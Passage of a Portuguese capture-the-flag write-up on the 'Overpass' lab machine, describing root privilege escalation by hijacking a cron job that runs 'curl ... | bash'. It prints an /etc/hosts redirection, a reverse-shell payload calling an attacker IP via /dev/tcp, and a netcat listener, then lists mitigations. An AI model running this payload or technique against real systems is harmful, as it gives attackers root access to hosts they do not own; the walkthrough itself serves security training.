---
# Parte 2
## Overpass — Privilege Escalation

Após obter acesso ao sistema com o usuário `james`, a próxima etapa consiste em identificar vetores de escalonamento de privilégios.

Durante a enumeração inicial, o conteúdo do diretório home revela um arquivo `todo.txt`.
 
```bash
ls
cat todo.txt
```

Conteúdo relevante:

```
Ask Paradox how he got the automated build script working and where the builds go.
They're not updating on the website
```

A referência a **automated build script** sugere a existência de um processo automatizado de compilação ou atualização, possivelmente executado por um job agendado.

---

Enumeração de tarefas agendadas

A verificação do arquivo `/etc/crontab` confirma a existência de um cron job executado com privilégios `root`.

```bash
cat /etc/crontab
```

Entrada relevante:

```bash
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Esse job executa a cada minuto e realiza duas operações críticas:

1. baixa um script remoto utilizando `curl`
2. executa imediatamente o conteúdo usando `bash`

Esse padrão (`curl | bash`) é considerado inseguro porque executa código remoto sem validação de integridade.

---

Exploração — Controle da resolução DNS

O domínio utilizado no download é `overpass.thm`.
A resolução desse domínio pode ser manipulada localmente através do arquivo `/etc/hosts`.

Adicionando uma entrada:

```
192.168.178.118 overpass.thm
```

Todas as requisições para `overpass.thm` passam a ser redirecionadas para a máquina controlada pelo atacante.

---

Preparação do payload

Para que o cron job execute o payload malicioso, é necessário hospedar um script no mesmo caminho requisitado pelo cron.

Estrutura do diretório:

```
downloads/
└── src/
    └── buildscript.sh
```

Conteúdo do script:

```bash
#!/bin/bash
sh -i >& /dev/tcp/192.168.178.118/9001 0>&1
```

A reverse shell utilizada foi gerada com o auxílio do Reverse Shell Generator.

---

Recebendo a conexão

Um listener é iniciado na máquina do atacante utilizando `netcat`.

```bash
nc -nvlp 9001
```

Quando o cron job executa novamente, o sistema baixa o script malicioso e o executa com privilégios root.

Resultado:

```
connect to [192.168.178.118] from (UNKNOWN) [10.67.191.69]
```

Verificação de privilégios:

```bash
whoami
id
```

Saída:

```
root
uid=0(root) gid=0(root)
```

O processo confirma que o script foi executado com privilégios de superusuário.

---

Impacto

* execução arbitrária de código com privilégios root
* comprometimento completo do sistema
* possibilidade de persistência e movimentação lateral

---

Mitigações

Administradores podem reduzir esse risco adotando as seguintes medidas:

* evitar execução direta de scripts remotos via `curl | bash`
* validar integridade de scripts antes da execução
* restringir resolução DNS interna
* executar tarefas automatizadas com privilégios mínimos


Riscos objetivos

* execução de código remoto com privilégios root
* comprometimento total do host
* possibilidade de exfiltração de dados
